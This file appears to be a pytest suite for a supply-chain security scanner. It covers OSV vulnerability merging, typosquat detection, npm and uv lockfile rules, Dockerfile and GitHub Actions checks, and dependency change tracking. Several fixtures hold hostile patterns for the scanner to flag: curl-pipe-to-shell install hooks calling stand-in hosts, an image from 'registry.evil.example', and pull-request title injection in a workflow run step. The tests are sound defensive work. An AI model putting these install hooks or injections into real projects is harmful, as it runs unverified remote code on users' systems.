"""Day-1 detection: vulnerabilities (with a fake OSV), suspicious-change rules, CI workflows, change diff."""
import json
import sqlite3

import pytest
from fastapi.testclient import TestClient

from backend.main import create_app
from backend.models import DiscoveryResult
from backend.services import sbom_service, vulnerability_service
from backend.services.discovery_service import discover_uploads
from backend.services.graph_service import PathFinder
from backend.services.popular_packages import lookalike_of, within_one_edit
from backend.services.repository_service import RepositoryService
from backend.services.storage_service import AnalysisStore
from backend.services.vulnerability_service import OsvError, cvss3_base_score, scan
from backend.utils.file_utils import classify_file

PYYAML_GHSA = {
    "id": "GHSA-8q59-q68h-6hv4", "summary": "Improper Input Validation in PyYAML",
    "aliases": ["CVE-2020-14343", "PYSEC-2021-142"],
    "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}],
    "affected": [{"package": {"name": "pyyaml", "ecosystem": "PyPI"},
                  "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.4"}]}]}],
    "references": [{"url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14343"}],
}
PYYAML_PYSEC = {"id": "PYSEC-2021-142", "aliases": ["CVE-2020-14343", "GHSA-8q59-q68h-6hv4"], "details": "dup"}
URLLIB3 = {
    "id": "GHSA-urll-ib3x-0001", "summary": "urllib3 header leak", "aliases": ["CVE-2099-0001"],
    "database_specific": {"severity": "MODERATE"},
    "affected": [{"package": {"name": "urllib3", "ecosystem": "PyPI"},
                  "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "99.0.0"}]}]}],
}


class FakeOsv:
    def __init__(self, by_name=None, fail=False):
        self.by_name, self.fail, self.queries = by_name or {}, fail, []

    def query_batch(self, queries):
        if self.fail:
            raise OsvError("OSV query failed: ConnectError")
        self.queries = queries
        return [[d["id"] for d in self.by_name.get(q["package"]["name"], [])] for q in queries]

    def get_vuln(self, vid):
        return next((d for docs in self.by_name.values() for d in docs if d["id"] == vid), None)


# ----------------------------------------------------------------- scoring
def test_cvss3_scores_match_the_specification():
    assert cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H") == 9.8
    assert cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N") == 6.1
    assert cvss3_base_score("CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N") == 5.5
    assert cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N") == 0.0
    assert cvss3_base_score("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N") is None


# ------------------------------------------------------------- vulnerabilities
def test_scan_merges_aliases_scores_and_finds_the_fix(samples):
    res, _ = discover_uploads(samples("python-sample", "requirements.txt"))
    fake = FakeOsv({"pyyaml": [PYYAML_GHSA, PYYAML_PYSEC]})
    out = scan(res.components, client=fake)
    assert {q["package"]["name"] for q in fake.queries} >= {"pyyaml", "flask"}  # names are canonicalised for OSV
    assert len(out.findings) == 1  # GHSA + PYSEC describe one flaw
    f = out.findings[0]
    assert f.title.startswith("CVE-2020-14343") and f.severity == "critical" and f.cvss_score == 9.8
    assert f.fixed_versions == ["5.4"] and f.component_name == "PyYAML" and f.risk == "critical"
    assert {"GHSA-8q59-q68h-6hv4", "PYSEC-2021-142", "CVE-2020-14343"} <= set(f.vulnerability_ids)
    assert any(e.source == "requirements.txt" for e in f.evidence) and any(e.source == "OSV.dev" for e in f.evidence)
    assert out.checked == 4 and out.not_checked == 0


def test_scan_skips_unresolved_versions_and_survives_osv_outage():
    res, _ = discover_uploads({"requirements.txt": b"requests\nflask==2.2.2\n"})
    out = scan(res.components, client=FakeOsv(fail=True))
    assert out.checked == 1 and out.not_checked == 1   # unresolved 'requests' is never guessed
    assert out.findings == [] and "NOT checked" in out.status and out.warnings


def test_vulnerabilities_flow_into_paths_risk_and_sbom(samples, monkeypatch):
    monkeypatch.setenv("SSC_VULN_SCAN", "true")
    monkeypatch.setattr(vulnerability_service, "OsvClient", lambda: FakeOsv({"urllib3": [URLLIB3]}))
    res, sbom = discover_uploads(samples("python-uv-sample", "pyproject.toml", "uv.lock"))
    vulns = [f for f in res.findings if f.category == "vulnerability"]
    assert vulns and all(f.severity == "medium" and f.dependency_type == "transitive" for f in vulns)
    # traced back to its source: app -> requests -> urllib3
    assert vulns[0].paths and vulns[0].paths[0][0] == "python-uv-sample" and vulns[0].paths[0][-1].startswith("urllib3")
    assert any("requests" in step for step in vulns[0].paths[0])
    assert res.risk.vulnerabilities == len(vulns) and res.risk.vulnerable_components >= 1
    assert len(sbom["vulnerabilities"]) == len(vulns)
    assert sbom["vulnerabilities"][0]["id"] == "CVE-2099-0001"
    assert sbom_service.validate_cyclonedx(sbom) == []


# ----------------------------------------------------------------- typosquat
@pytest.mark.parametrize("a,b,expected", [
    ("requests", "reqeusts", True), ("requests", "request", True), ("requests", "requestz", True),
    ("requests", "requests", False), ("requests", "rquest", False), ("lodash", "lodahs", True),
])
def test_within_one_edit(a, b, expected):
    assert within_one_edit(a, b) is expected


def test_lookalike_detection():
    assert lookalike_of("reqeusts", "pypi")[0] == "requests"
    assert lookalike_of("crossenv", "npm") == ("cross-env", "same name with different separators")
    assert lookalike_of("requests", "pypi") is None and lookalike_of("safer-buffer", "npm") is None
    assert lookalike_of("my-internal-lib", "npm") is None


def test_typosquat_finding_in_a_manifest():
    res, _ = discover_uploads({"requirements.txt": b"reqeusts==2.31.0\nflask==2.2.2\n"})
    f = next(f for f in res.findings if f.rule == "typosquatting")
    assert f.component_name == "reqeusts" and f.risk == "high" and "requests" in f.title


# ----------------------------------------------------------------- npm rules
def _npm(lock_packages, pj):
    lock = {"name": "app", "lockfileVersion": 3, "packages": lock_packages}
    return {"package.json": json.dumps(pj).encode(), "package-lock.json": json.dumps(lock, indent=2).encode()}


def test_npm_lockfile_rules():
    files = _npm({
        "": {"name": "app", "dependencies": {"left-pad": "^1.3.0", "evil": "1.0.0", "ghost": "1.0.0"}},
        "node_modules/left-pad": {"version": "1.3.0", "resolved": "http://registry.example/left-pad-1.3.0.tgz",
                                  "integrity": "sha512-x"},
        "node_modules/evil": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/x/evil.git#abc",
                              "hasInstallScript": True},
        "node_modules/ghost": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/ghost/-/ghost-1.0.0.tgz"},
        "node_modules/leftover": {"version": "2.0.0", "resolved": "https://registry.npmjs.org/leftover/-/l.tgz",
                                  "integrity": "sha512-y", "extraneous": True},
    }, {"name": "app", "dependencies": {"left-pad": "^1.2.0", "evil": "1.0.0", "missing-one": "^2.0.0"},
        "scripts": {"postinstall": "curl -s https://x.example/setup.sh | sh"}})
    res, _ = discover_uploads(files)
    rules = {(f.rule, f.component_name) for f in res.findings}
    assert ("insecure-source", "left-pad") in rules
    assert ("non-registry-source", "evil") in rules and ("install-script", "evil") in rules
    assert ("missing-integrity", "ghost") in rules
    assert ("unexpected-dependency", "leftover") in rules        # extraneous
    assert ("unexpected-dependency", "ghost") in rules           # in lock root, not in package.json
    assert ("lockfile-mismatch", "left-pad") in rules            # ^1.2.0 vs ^1.3.0
    assert ("lockfile-mismatch", "missing-one") in rules
    hook = next(f for f in res.findings if f.rule == "unsafe-install-script")
    assert hook.risk == "high" and hook.evidence[0].line is not None
    lp = next(f for f in res.findings if f.rule == "insecure-source")
    assert lp.evidence[0].source == "package-lock.json" and lp.evidence[0].line


def test_clean_samples_raise_no_suspicious_noise(samples):
    for proj, names in [("python-uv-sample", ["pyproject.toml", "uv.lock"]),
                        ("javascript-sample", ["package.json", "package-lock.json"]),
                        ("java-sample", ["pom.xml"]), ("python-sample", ["requirements.txt"])]:
        res, _ = discover_uploads(samples(proj, *names))
        noisy = [f for f in res.findings if f.category == "suspicious" and f.risk not in {"low", "info"}]
        assert noisy == [], (proj, [f.title for f in noisy])


# ----------------------------------------------------------------- uv rules
def test_uv_lock_out_of_sync_with_pyproject(samples):
    files = samples("python-uv-sample", "pyproject.toml", "uv.lock")
    files["pyproject.toml"] = files["pyproject.toml"].replace(b'"flask==2.2.2"', b'"flask==2.3.0", "rich>=13"')
    res, _ = discover_uploads(files)
    mism = {f.component_name: f for f in res.findings if f.rule == "lockfile-mismatch"}
    assert set(mism) == {"flask", "rich"}
    assert mism["flask"].evidence[0].source == "pyproject.toml" and "==2.3.0" in mism["flask"].evidence[0].detail


def test_uv_lock_non_registry_source(samples):
    files = samples("python-uv-sample", "pyproject.toml", "uv.lock")
    import re
    files["uv.lock"], n = re.subn(
        rb'(name = "idna"\nversion = "[^"]+"\n)source = \{ registry = "https://pypi.org/simple" \}',
        rb'\1source = { registry = "http://mirror.example/simple" }', files["uv.lock"], count=1)
    assert n == 1
    res, _ = discover_uploads(files)
    f = next((f for f in res.findings if f.rule == "insecure-source"), None)
    assert f and f.component_name == "idna" and f.risk in {"high", "medium"}


# ----------------------------------------------------------------- Dockerfile
def test_dockerfile_rules():
    df = (b"FROM someuser/python:3.12\n"
          b"RUN curl -fsSL https://get.example.com/install.sh | bash\n"
          b"ADD https://example.com/tool.tgz /opt/\n"
          b"FROM registry.evil.example/base\n")
    res, _ = discover_uploads({"Dockerfile": df})
    by = {}
    for f in res.findings:
        by.setdefault(f.rule, []).append(f)
    assert by["remote-script"][0].evidence[0].line == 2 and by["remote-script"][0].risk == "high"
    assert by["unverified-download"][0].evidence[0].line == 3
    titles = " ".join(f.title for f in by["untrusted-image"])
    assert "Docker Hub user" in titles and "unrecognised registry" in titles and "':latest'" in titles


# ----------------------------------------------------------------- CI workflows
WORKFLOW = """
name: ci
on:
  pull_request_target:
  push:
jobs:
  build:
    runs-on: ubuntu-latest
    container: node:20
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: some-org/deploy-action@main
      - uses: other/tool@1234567890abcdef1234567890abcdef12345678
      - uses: ./local-action
      - run: echo "${{ github.event.pull_request.title }}"
      - run: curl -sSL https://install.example.sh | sh
  reuse:
    uses: org/shared/.github/workflows/build.yml@v1
"""


def test_workflow_classification():
    assert classify_file(".github/workflows/ci.yml") == "github-workflow"
    assert classify_file("ci.yml", WORKFLOW) == "github-workflow"      # uploaded on its own
    assert classify_file("config.yml", "a: 1\n") is None
    assert classify_file("docs/ci.yml") is None


def test_workflow_components_and_findings():
    res, _ = discover_uploads({"ci.yml": WORKFLOW.encode()})
    comps = {(c.ecosystem, c.name): c for c in res.components}
    assert comps[("github-actions", "actions/checkout")].version_status == "declared"
    assert comps[("github-actions", "other/tool")].version_status == "pinned"
    assert ("github-actions", "org/shared") in comps and ("docker", "node") in comps
    assert all(c.scope == "ci" for c in comps.values())
    assert res.summary.transitive_resolution == "none" and any("local action" in w for w in res.warnings)
    f = {(x.rule, x.component_name or ""): x for x in res.findings}
    assert f[("unpinned-action", "some-org/deploy-action")].risk == "high"           # third party on a branch
    assert f[("unpinned-action", "actions/checkout")].severity == "low"              # GitHub-owned tag
    assert ("unpinned-action", "other/tool") not in f                                 # SHA-pinned: fine
    assert any(x.rule == "untrusted-input-in-script" for x in res.findings)
    assert any(x.rule == "dangerous-trigger" for x in res.findings)
    assert any(x.rule == "remote-script" for x in res.findings)
    assert all(e.line for x in res.findings for e in x.evidence if e.source == "ci.yml")


def test_workflow_does_not_downgrade_lockfile_resolution(samples):
    files = samples("python-uv-sample", "pyproject.toml", "uv.lock")
    files["ci.yml"] = WORKFLOW.encode()
    res, _ = discover_uploads(files)
    assert res.summary.transitive_resolution == "full-from-lockfile"


# ----------------------------------------------------------------- what changed
def test_change_detection_between_analyses(tmp_path):
    client = TestClient(create_app(store=AnalysisStore(tmp_path / "c.db"), repo_service=RepositoryService()))

    def up(body):
        r = client.post("/api/discover/file", files=[("files", ("requirements.txt", body, "text/plain"))])
        assert r.status_code == 200, r.text
        return DiscoveryResult.model_validate(r.json())

    first = up(b"flask==2.3.0\nrequests==2.31.0\n")
    assert first.changes is None
    second = up(b"flask==2.2.2\nrequests==2.31.0\nrich==13.0.0\n")
    ch = {c.name: c.change for c in second.changes.changes}
    assert ch == {"flask": "downgraded", "rich": "added"} and second.changes.previous_analysis_id == first.analysis_id
    rules = {f.rule: f for f in second.findings}
    assert rules["version-downgrade"].component_name == "flask" and rules["new-dependency"].component_name == "rich"
    assert "2.3.0" in rules["version-downgrade"].title and "2.2.2" in rules["version-downgrade"].title
    stored = client.get(f"/api/discovery/{second.analysis_id}/findings").json()
    assert {f["rule"] for f in stored} >= {"version-downgrade", "new-dependency"}


def test_storage_migrates_old_databases(tmp_path):
    db = tmp_path / "old.db"
    with sqlite3.connect(db) as c:
        c.execute("CREATE TABLE analyses (id TEXT PRIMARY KEY, created_at TEXT NOT NULL, result TEXT NOT NULL, sbom TEXT)")
    store = AnalysisStore(db)
    res, sbom = discover_uploads({"requirements.txt": b"flask==2.2.2\n"})
    store.save(res, sbom)
    assert store.get(res.analysis_id).analysis_id == res.analysis_id and store.previous(res) is None


# ----------------------------------------------------------------- paths
def test_pathfinder_returns_all_shortest_paths_only():
    edges = [("root", "a"), ("root", "b"), ("a", "c"), ("b", "c"), ("c", "d"), ("root", "x"), ("x", "y"), ("y", "a")]
    pf = PathFinder(edges)
    assert sorted(pf.paths("d", 5)) == [["root", "a", "c", "d"], ["root", "b", "c", "d"]]
    assert pf.paths("nope") == [] and pf.paths("root") == [["root"]]


def test_suspicious_sample_fires_every_day1_rule(samples):
    res, sbom = discover_uploads(samples("suspicious-sample", "package.json", "package-lock.json", "ci.yml"))
    rules = {f.rule for f in res.findings}
    assert rules >= {"typosquatting", "unsafe-install-script", "install-script", "insecure-source", "non-registry-source",
                     "missing-integrity", "lockfile-mismatch", "unexpected-dependency", "untrusted-image",
                     "remote-script", "unpinned-action", "untrusted-input-in-script", "dangerous-trigger"}
    assert res.findings[0].risk == "high" and all(f.evidence for f in res.findings)
    assert sbom_service.validate_cyclonedx(sbom) == []
